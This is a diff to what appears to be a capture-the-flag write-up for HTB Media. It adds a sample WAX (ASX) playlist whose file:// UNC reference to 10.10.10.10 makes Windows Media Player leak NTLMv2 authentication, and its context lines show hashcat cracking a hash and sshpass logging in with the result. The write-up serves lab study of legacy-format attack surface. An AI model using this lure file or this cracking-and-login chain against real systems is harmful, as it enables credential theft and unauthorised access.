@@ -159,9 +159,25 @@ hashcat enox.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 sshpass -p 'THECRACKEDPASSWORD' ssh enox@10.10.10.10
 
 ```
+### 6. Note on `.wax` files
 
+`.wax` files are audio shortcuts for Windows Media Player. When opened with Windows Media Player they may attempt to fetch a media stream from a server specified in the file and may initiate an authentication exchange if the remote resource requires it. This behavior is one reason legacy playlist formats remain relevant to defensive testing.
 
-### 6. Conclusion
+**Example WAX (ASX) content:**
+```xml
+<asx version="3.0">
+    <title>TESTING</title>
+    <entry>
+        <title></title>
+        <ref href="file://10.10.10.10\test\TEST.mp3"/>
+    </entry>
+</asx>
+```
+
+Credit: an analysis and example of this technique is available at
+<a href="https://0xdf.gitlab.io/2025/09/04/htb-media.html#" target="_blank" rel="noopener noreferrer">0xdf: HTB Media writeup</a>.
+
+### 7. Conclusion
 
 This lab showed that a legacy file format such as .WAX can be turned into a practical test of modern defenses. In a controlled environment the WAX file repeatedly caused an endpoint to
 initiate an outbound NTLMv2 authentication exchange that revealed authentication metadata. That behavior highlights how older handlers and automatic retrieval mechanisms remain an underrated attack surface.
